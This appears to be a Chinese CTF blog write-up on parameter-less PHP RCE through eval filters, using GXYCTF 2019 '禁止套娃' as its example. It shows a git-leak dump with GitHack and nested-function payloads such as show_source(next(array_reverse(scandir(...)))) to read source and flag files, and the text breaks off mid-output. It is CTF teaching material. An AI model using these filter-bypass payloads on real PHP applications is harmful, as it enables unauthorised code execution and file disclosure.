 &lt;h1 id=&#34;у«ђУ┐░&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#у«ђУ┐░&#34;&gt;#&lt;/a&gt; у«ђУ┐░№╝џ&lt;/h1&gt;
&lt;p&gt;РђІ	ждќтЁѕУ»┤СИђСИІС╗ђС╣ѕТў»ТЌатЈѓТЋ░ RCE№╝їт»╣С║јтЙѕтцџТЌХтђЎ№╝їТѕЉС╗гжђџтИИжЂЄтѕ░ PHP СИГтГўтюе eval тЄйТЋ░уџёТЌХтђЎ№╝їСИђУѕгТў»жђџУ┐ЄТъёжђа№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;title function_ invoke__&#34;&gt;system&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;cat /flag&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	уџё payload ТЮЦт«ъУАїТћ╗тЄ╗уџё№╝їтцДСИЇС║єт░▒тЄ║уј░С║єСИђС║Џ waf жюђУдЂу╗ЋУ┐ЄсђѓСйєТў»№╝їТюЅуџёТЌХтђЎ№╝їС╗ќС╗гуЏИтЁ│уџё waf уЅ╣тѕФтЦЄУЉЕ№╝їтЃЈТў»У┐ЄТ╗цС║єТЅђТюЅуџётГЌТ»ЇС╗ЦтЈіТЋ░тГЌС╗ђС╣ѕуџё№╝їтЈдтцќ№╝їт░▒Тў»У┐Ўу»ЄтЇџт«бТюђСИ╗УдЂУ»┤ТўјуџёжбўуЏ«№╝їт░▒Тў»ТЌатЈѓТЋ░ RCE№╝џ&lt;/p&gt;
&lt;p&gt;РђІ	тЃЈТў»СИІжЮбуџёУ┐ЎСИђСИфТГБтѕЎ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt; === &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/[^\W]+\((?R)?\)/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;star&amp;#x27;&lt;/span&gt;])) &amp;#123;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;star&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	у╗ЈУ┐ЄС║єт«ЃуџёУ┐ЄТ╗цС╣Ітљј№╝їТюђтљјтЈфТюЅ a (b (c ()));	У┐ЎТаиуџё payload ТЅЇСИЇС╝џУбФУ┐ЄТ╗цС║єсђѓ&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;ТГБтѕЎУАеУЙЙт╝Ј [^\W]+((?R)?) тї╣жЁЇС║єСИђСИфТѕќтцџСИфжЮъТаЄуѓ╣угдтЈитГЌугд№╝ѕУАеуц║тЄйТЋ░тљЇ№╝Ѕ№╝їтљјУиЪСИђСИфТІгтЈи№╝ѕУАеуц║тЄйТЋ░У░Ѓуће№╝ЅсђѓтЁХСИГ (?R) Тў»жђњтйњт╝Ћуће№╝їт«ЃтЈфУЃйтї╣жЁЇтњїТЏ┐ТЇбтхїтЦЌуџётЄйТЋ░У░Ѓуће№╝їУђїСИЇУЃйтцёуљєтЄйТЋ░тЈѓТЋ░сђѓСй┐ућеУ»ЦТГБтѕЎУАеУЙЙт╝ЈУ┐ЏУАїТЏ┐ТЇбтљј№╝їТ»ЈСИфтЄйТЋ░У░ЃућежЃйС╝џУбФтѕажЎц№╝їтЈфтЅЕСИІСИђСИфтѕєтЈи№╝Џ№╝їУђїТюђу╗ѕу╗ЊТъют╝║уГЅС║ј№╝ЏТЌХ№╝їpayload ТЅЇУЃйУ┐ЏУАїСИІСИђТГЦсђѓу«ђУђїУеђС╣І№╝їТЌатЈѓТЋ░ rce т░▒Тў»СИЇСй┐ућетЈѓТЋ░№╝їУђїтЈфСй┐ућеСИђСИфСИфтЄйТЋ░Тюђу╗ѕУЙЙтѕ░уЏ«уџёсђѓ&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;уЏИтЁ│тЄйТЋ░У«▓УДБ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#уЏИтЁ│тЄйТЋ░У«▓УДБ&#34;&gt;#&lt;/a&gt; уЏИтЁ│тЄйТЋ░У«▓УДБ№╝џ&lt;/h1&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;scandir () : т░єУ┐ћтЏътйЊтЅЇуЏ«тйЋСИГуџёТЅђТюЅТќЄС╗ХтњїуЏ«тйЋуџётѕЌУАесђѓУ┐ћтЏъуџёу╗ЊТъюТў»СИђСИфТЋ░у╗ё№╝їтЁХСИГтїЁтљФтйЊтЅЇуЏ«тйЋСИІуџёТЅђТюЅТќЄС╗ХтњїуЏ«тйЋтљЇуД░№╝ѕglob () тЈ»ТЏ┐ТЇб№╝Ѕ&lt;/li&gt;
&lt;li&gt;localeconv () №╝џУ┐ћтЏъСИђтїЁтљФТюгтю░ТЋ░тГЌтЈіУ┤ДтИЂТа╝т╝ЈС┐АТЂ»уџёТЋ░у╗ёсђѓ№╝ѕСйєТў»У┐ЎжЄїТЋ░у╗ёуггСИђжА╣т░▒Тў»Рђў.РђЎ№╝їУ┐ЎСИфсђѓуџёућетцётЙѕтцД№╝Ѕ&lt;/li&gt;
&lt;li&gt;current () №╝џУ┐ћтЏъТЋ░у╗ёСИГуџётЇЋтЁЃ№╝їж╗ўУ«цтЈќуггСИђСИфтђ╝сђѓpos () тњї current () Тў»тљїСИђСИфСИюУЦ┐&lt;/li&gt;
&lt;li&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9zby5jc2RuLm5ldC9zby9zZWFyY2g/cT1nZXRjd2QmYW1wO3NwbT0xMDAxLjIxMDEuMzAwMS43MDIw&#34;&gt;getcwd&lt;/span&gt; () : тЈќтЙЌтйЊтЅЇтиЦСйюуЏ«тйЋ&lt;/li&gt;
&lt;li&gt;dirname (): тЄйТЋ░У┐ћтЏъУи»тЙёСИГуџёуЏ«тйЋжЃетѕє&lt;/li&gt;
&lt;li&gt;array_flip () : С║цТЇбТЋ░у╗ёСИГуџёжћ«тњїтђ╝№╝їТѕљтіЪТЌХУ┐ћтЏъС║цТЇбтљјуџёТЋ░у╗ё&lt;/li&gt;
&lt;li&gt;array_rand () : С╗јТЋ░у╗ёСИГжџЈТю║тЈќтЄ║СИђСИфТѕќтцџСИфтЇЋтЁЃ&lt;/li&gt;
&lt;li&gt;array_reverse (): т░єТЋ░у╗ётєЁт«╣тЈЇУйг&lt;/li&gt;
&lt;li&gt;strrev (): ућеС║јтЈЇУйгу╗Ўт«џтГЌугдСИ▓&lt;/li&gt;
&lt;li&gt;getcwd ()№╝џУјитЈќтйЊтЅЇтиЦСйюуЏ«тйЋУи»тЙё&lt;/li&gt;
&lt;li&gt;dirname () №╝џтЄйТЋ░У┐ћтЏъУи»тЙёСИГуџёуЏ«тйЋжЃетѕєсђѓ&lt;/li&gt;
&lt;li&gt;chdir () №╝џтЄйТЋ░Тћ╣тЈўтйЊтЅЇуџёуЏ«тйЋсђѓ&lt;/li&gt;
&lt;li&gt;eval ()сђЂassert ()№╝џтЉйС╗цТЅДУАї&lt;/li&gt;
&lt;li&gt;hightlight_file ()сђЂshow_source ()сђЂreadfile ()№╝џУ»╗тЈќТќЄС╗ХтєЁт«╣&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;РђІ	ТЋ░у╗ёуД╗тіеТЊЇСйю№╝џ&lt;/p&gt;
&lt;blockquote&gt;
&lt;ul&gt;
&lt;li&gt;end () №╝џ т░єтєЁжЃеТїЄжњѕТїЄтљЉТЋ░у╗ёСИГуџёТюђтљјСИђСИфтЁЃу┤а№╝їт╣ХУЙЊтЄ║&lt;/li&gt;
&lt;li&gt;next () №╝џт░єтєЁжЃеТїЄжњѕТїЄтљЉТЋ░у╗ёСИГуџёСИІСИђСИфтЁЃу┤а№╝їт╣ХУЙЊтЄ║&lt;/li&gt;
&lt;li&gt;prev () №╝џт░єтєЁжЃеТїЄжњѕТїЄтљЉТЋ░у╗ёСИГуџёСИіСИђСИфтЁЃу┤а№╝їт╣ХУЙЊтЄ║&lt;/li&gt;
&lt;li&gt;reset () №╝џ т░єтєЁжЃеТїЄжњѕТїЄтљЉТЋ░у╗ёСИГуџёуггСИђСИфтЁЃу┤а№╝їт╣ХУЙЊтЄ║&lt;/li&gt;
&lt;li&gt;each () №╝џ У┐ћтЏътйЊтЅЇтЁЃу┤ауџёжћ«тљЇтњїжћ«тђ╝№╝їт╣Хт░єтєЁжЃеТїЄжњѕтљЉтЅЇуД╗тіе&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;h1 id=&#34;жбўуЏ«уц║СЙІgxyctf-2019удЂТГбтЦЌтеЃ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#жбўуЏ«уц║СЙІgxyctf-2019удЂТГбтЦЌтеЃ&#34;&gt;#&lt;/a&gt; жбўуЏ«уц║СЙІ№╝џ[GXYCTF 2019] удЂТГбтЦЌтеЃ&lt;/h1&gt;
&lt;p&gt;РђІ	тЁѕУ»┤жбўуЏ«№╝їждќтЁѕТў»СИђСИфС┐АТЂ»ТљюжЏє№╝їСИЇУ┐ЄУ┐ЎСИфС┐АТЂ»ТљюжЏєжђџУ┐ЄтцџТгАт░ЮУ»ЋТѕќУђЁТЅФтљјтЈ░тЈЉуј░С║є.git/ ТќЄС╗Хтц╣№╝їуїюТхІТў» git Т│ёжю▓№╝їуЏ┤ТјЦ Githack СИІТ║љуаЂ№╝їтЙЌтѕ░ index.php уџётєЁт«╣№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;D:\c\python tools\GitHack&amp;gt;python GitHack.py http://node4.anna.nssctf.cn:28131/.git&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] Download and parse index file ...&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] flag.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[+] index.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[OK] flag.php&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;[OK] index.php&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	С╣ІтљјтЙЌтѕ░ Index.php Т║љуаЂтдѓСИІ№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;&amp;lt;?php&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flag.php&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;quot;flagтюетЊфжЄїтЉб№╝Ъ&amp;lt;br&amp;gt;&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;keyword&#34;&gt;isset&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]))&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/data:\/\/|filter:\/\/|php:\/\/|phar:\/\//i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;;&amp;#x27;&lt;/span&gt; === &lt;span class=&#34;title function_ invoke__&#34;&gt;preg_replace&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/[a-z,_]+\((?R)?\)/&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (!&lt;span class=&#34;title function_ invoke__&#34;&gt;preg_match&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;])) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;comment&#34;&gt;// echo $_GET[&amp;#x27;exp&amp;#x27;];&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                @&lt;span class=&#34;keyword&#34;&gt;eval&lt;/span&gt;(&lt;span class=&#34;variable&#34;&gt;$_GET&lt;/span&gt;[&lt;span class=&#34;string&#34;&gt;&amp;#x27;exp&amp;#x27;&lt;/span&gt;]);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;У┐ўти«СИђуѓ╣тЊд№╝Ђ&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;тєЇтЦйтЦйТЃ│ТЃ│№╝Ђ&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;die&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;У┐ўТЃ│У»╗flag№╝їУЄГт╝Ът╝Ъ№╝Ђ&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;// highlight_file(__FILE__);&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	У┐ЎжЄїтЈфжюђУдЂтЁ│т┐ЃуггС║їт▒ѓу╗ЋУ┐Є№╝їСИ╗УдЂУђЃуѓ╣т║ћУ»ЦТў»У┐ЎСИђт▒ѓ№╝їС╣Ът░▒Тў»ТЌатЈѓТЋ░ RCEсђѓ&lt;/p&gt;
&lt;h1 id=&#34;1тИИУДёТќ╣Т│Ћ&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#1тИИУДёТќ╣Т│Ћ&#34;&gt;#&lt;/a&gt; 1. тИИУДёТќ╣Т│Ћ№╝џ&lt;/h1&gt;
&lt;p&gt;РђІ	жђџтИИТЃЁтєхСИІ№╝ї ТѕЉС╗гТЃ│УдЂУ»╗тЈќУ»ЦуЏ«тйЋуџёТќЄС╗ХтєЁт«╣№╝їжѓБС╣ѕ№╝їтИИУДёуџёТќ╣Т│Ћт░▒Тў»тдѓСИІ№╝їСИЇУ┐Є№╝їтЁѕу╗ЎСИђСИф payload№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;?exp=&lt;span class=&#34;title function_ invoke__&#34;&gt;show_source&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;next&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;array_reverse&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;scandir&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;current&lt;/span&gt;(&lt;span class=&#34;title function_ invoke__&#34;&gt;localeconv&lt;/span&gt;())))));&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;РђІ	ждќтЁѕ№╝їжђџУ┐ЄжђџУ┐Є localeconv () ТЮЦ №╝їУ┐ћтЏъСИђтїЁтљФТюгтю░ТЋ░тГЌтЈіУ┤ДтИЂТа╝т╝ЈС┐АТЂ»уџёТЋ░у╗ё№╝їтЈѕтЏаСИ║ТЋ░у╗ёуџёуггСИђжА╣Тў» &#39;.№╝їтЏаТГцтЈ»С╗ЦжђџУ┐Є current () №╝ѕУ┐ћтЏъТЋ░у╗ёСИГуџётЇЋтЁЃ№╝їж╗ўУ«цтЈќуггСИђСИфтђ╝№╝ЅТЮЦУјитЈќТЋ░у╗ёСИГуџёуггСИђСИфтЈѓТЋ░С╣Ът░▒Тў»жѓБСИђСИфуѓ╣№╝џ&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//payload  			?exp=var_dump(localeconv());&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;//output:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;array&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;18&lt;/span&gt;) &amp;#123; [&lt;span class=&#34;string&#34;&gt;&amp;quot;decimal_point&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;thousands_sep&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;int_curr_symbol&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;currency_symbol&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;mon_decimal_point&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;mon_thousands_sep&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;positive_sign&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;negative_sign&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;string&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;) &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt; [&lt;span class=&#34;string&#34;&gt;&amp;quot;int_frac_digits&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;frac_digits&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;p_cs_precedes&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;p_sep_by_space&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;n_cs_precedes&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;n_sep_by_space&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;p_sign_posn&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span class=&#34;keyword&#34;&gt;int&lt;/span&gt;(&lt;span class=&#34;number&#34;&gt;127&lt;/span&gt;) [&lt;span class=&#34;string&#34;&gt;&amp;quot;n_sign_posn&amp;quot;&lt;/span&gt;]=&amp;gt; &lt;span 